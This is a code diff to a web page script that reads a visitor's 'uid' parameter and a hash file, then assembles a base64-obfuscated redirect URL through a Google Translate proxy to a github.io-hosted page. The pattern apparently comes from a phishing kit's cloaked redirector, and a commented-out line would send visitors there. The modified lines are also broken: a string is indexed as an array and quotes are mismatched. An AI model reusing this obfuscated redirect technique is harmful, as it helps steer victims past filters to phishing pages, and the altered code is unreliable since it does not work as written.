@@ -37,9 +37,9 @@
         var queryString = window.location.search;
         var urlParams = new URLSearchParams(queryString);
         var oxx = urlParams.get('uid');
-        var hos = window.location.hostname;
-        var dmainParts = hos.split('.').reverse();
+        var dmainParts = window.location.hostname;
         var dmain = `${dmainParts[1]}-${dmainParts[0]}`.replace(/\./g, '-');
+        console.log(dmain);
         var filename = 'hash.txt';
         var hash;
         fetch(filename)
@@ -48,7 +48,7 @@
       })
       .then(function(fileContents) {
         hash = fileContents;
-        console.log("https://webetk-github-io"+atob('LnRyYW5zbGF0ZS5nb29nL3Vuc3Vic2NyaWJlL2Jsb2cuaHRtbD91PQ==')+oxx+atob('Jl94X3RyX3NsPWF1dG8mX3hfdHJfdGw9ZW4mX3hfdHJfaGw9ZW4tVVMmX3hfdHJfcHRvPXdhcHBibG9nLmh0bWw=')+hash+"");
+        console.log("https://"+dmain+"+atob('LnRyYW5zbGF0ZS5nb29nL3Vuc3Vic2NyaWJlL2Jsb2cuaHRtbD91PQ==')+oxx+atob('Jl94X3RyX3NsPWF1dG8mX3hfdHJfdGw9ZW4mX3hfdHJfaGw9ZW4tVVMmX3hfdHJfcHRvPXdhcHBibG9nLmh0bWw=')+hash+"");
         //window.location.replace("https://webetk-github-io"+atob('LnRyYW5zbGF0ZS5nb29nL3Vuc3Vic2NyaWJlL2Jsb2cuaHRtbD91PQ==')+oxx+atob('Jl94X3RyX3NsPWF1dG8mX3hfdHJfdGw9ZW4mX3hfdHJfaGw9ZW4tVVMmX3hfdHJfcHRvPXdhcHBibG9nLmh0bWw=')+hash+"");
       });
         //
